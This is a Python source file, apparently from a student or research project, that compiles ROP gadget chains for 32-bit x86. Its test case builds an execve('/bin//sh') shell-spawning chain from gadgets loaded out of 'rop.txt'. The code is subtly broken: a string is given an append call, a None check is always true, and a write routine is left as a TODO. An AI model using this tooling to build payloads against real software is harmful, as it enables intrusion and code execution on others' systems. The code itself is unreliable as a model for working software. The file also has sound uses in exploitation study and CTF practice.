import copy
from struct import pack
from ROPcompile import dataaddressToValue
from ROPcompile import generalToBytes
import re
from Systems import *
registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

def addRet(gadget):
    return gadget.rstrip().append(" ; ret")

def removeRet(gadget):
    if gadget[-5:] == "; ret":
        return gadget[:-5]
    return gadget

def createGoal(shellcode):
    goal = SysState()
    run(goal, shellcode)
    return goal

def getWriterRegisters(gadget):
    dest = gadget[15:18]
    source = gadget[21:24]
    return dest, source

def regToSet(startstate, endstate):
    registersToSet = [x != y for x, y in zip(startstate.allRegisters(), endstate.allRegisters())]
    for i, r in enumerate(registers):
        if getFromLoc(endstate, r) == None:
            registersToSet[i] = False
    return registersToSet

def writeExecutionSearch(startstate, endstate, Gadgets):
    execution = []
    success = False

    #Find all writing gadgets
    writers = [x for x in Gadgets if (re.match("mov dword ptr \[[a-z]{3}\], [a-z]{3} ; ret", x) is not None)]
    print("writing gadgets:")
    print(writers)

    #Get Location to write to
    writeLocation = ".data"
    print("write location:")
    if len(startstate.datavalues) != 0:
        writeLocation += " + " + str(len(startstate.datavalues))
    print(writeLocation)

    #Get data to write
    writeData = endstate.datavalues[-4:]
    print(writeData)

    #Attempt to find executions which set registers for each write gadget
    for w in writers:
        locationreg, valuereg = getWriterRegisters(w)
        setGoal = copy.deepcopy(startstate)
        setToLoc(setGoal, locationreg, "@ " + writeLocation)
        setToLoc(setGoal, valuereg, writeData)
        print("Searching for write using: " + w)
        setexec = findExecution(startstate, setGoal, Gadgets)
        if len(setexec) > 0:
            success = True
            execution = setexec
            execution.append(w)
            print("Found write using " + w)
            break

    #Add execution which sets registers to desired endstate
    #TODO
    
    if success == False:
        return []
    return execution

def popcontrol(Gadgets):
    control = [""] * len(registers)
    search = "|".join(Gadgets)
    for i, r in enumerate(registers):
        s = re.search("(pop [a-z]{3} ; )*(pop "+r+" ; )(pop [a-z]{3} ; )*ret", search)
        if type(s) is not None:
            control[i] = s.group()
    return control

def movcontrol(Gadgets, popcontrolled):
    control = [[], [], [], [], [], [], [], []]
    for i, _ in enumerate(registers):
        for r in registers:
            if "mov " + registers[i] + ", " + r + " ; ret" in Gadgets:
                control[i].append(r)

    return control

def xorcontrol(Gadgets):
    control = [False] * len(registers)
    for i, r in enumerate(registers):
        if ("xor " + r + ", " + r + " ; ret" in Gadgets) and ("inc " + r + " ; ret" in Gadgets):
            print("xor control of " + r)
            control[i] = True
    return control

def setExecutionSearch(startstate, endstate, Gadgets):
    print()
    print("startstate")
    startstate.printSystem()
    print("endstate")
    endstate.printSystem()

    execution = []
    registersToSet = regToSet(startstate, endstate)

    popcontrolled = popcontrol(Gadgets)
    for i, r in enumerate(registers):
        if registersToSet[i] == True:
            pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
            values = []
            null = False
            for reg in pops:
                values.append(getFromLoc(endstate, reg))
                if values[-1] is None:
                    values[-1] = b'AAAA'
                if type(values[-1]) == bytes and b'\x00' in values[-1]:
                    null = True
            if null:
                continue             
            execution.append(popcontrolled[i])   
            for reg in pops:
                execution.append(values[pops.index(reg)])
                setToLoc(endstate, reg, getFromLoc(startstate, reg))
            print("here")
            print(execution)
            return execution
        
    xorcontrolled = xorcontrol(Gadgets)
    for i in range(len(registersToSet)):
        if registersToSet[i] == True and xorcontrolled[i] == True:
            execution.extend([("inc " + registers[i] + " ; ret")] * int.from_bytes(getFromLoc(endstate, registers[i]), byteorder="little"))
            execution.append("xor " + registers[i] + ", " + registers[i] + " ; ret")
            setToLoc(endstate, registers[i], None)
            return execution

def findExecution(startstate, endstate, Gadgets):
    execution = []
    if startstate.datavalues != endstate.datavalues:
        return writeExecutionSearch(startstate, endstate, Gadgets)
    while sum(regToSet(startstate, endstate)) != 0:
        print(startstate.allRegisters())
        print(endstate.allRegisters())
        section = setExecutionSearch(startstate, endstate, Gadgets)
        print(section)
        if section is None:
            return []
        section.extend(execution)
        execution = section
    return execution


#shellcode should be a list of assembly instructions as strings
#gadgets should be a list of gadgets that will be available as strings
def create(shellcode, gadgets):
    retgadgets = [x for x in gadgets if x[-3:] == "ret"]
    allowedgadgets = [x for x in retgadgets if x.count(';') < 3]

    #Generate Goal State
    Goal = createGoal(shellcode)
    Goal.printSystem()

    #Initialise Simulation
    GadgetSequence = []
    System = SysState()
    SubGoal = SysState()

    #Reverse Execution from goal
    execution = []

    #Load to .data
    while Goal.datavalues != System.datavalues:
        SubGoal = copy.deepcopy(System)
        SubGoal.datavalues = Goal.datavalues[:len(System.datavalues)+4]
        section = findExecution(System, SubGoal, allowedgadgets)
        if len(section) == 0:
            print("Failed to write to data")
            quit()
        else:
            print("Added data write")
        execution.extend(section)
        run(System, section)
        
    #Load register values
    regload = findExecution(System, Goal, allowedgadgets)
    execution.extend(regload)
    TestSystem = SysState()
    run(TestSystem, execution)
    TestSystem.printSystem()
    print(execution)
    execution.append("int 0x80")
    #Return Sequence of Gadgets
    return execution

if __name__ == "__main__":
    #gadgets = ["pop edx ; ret", "pop eax ; ret", "mov dword ptr [edx], eax ; ret", "xor eax, eax ; ret", "pop ebx ; ret", "pop ecx ; ret"]

    import ROPcompile
    dictionary = {}
    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
    gadgets = dictionary.keys()

    print("CREATE TEST")
    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
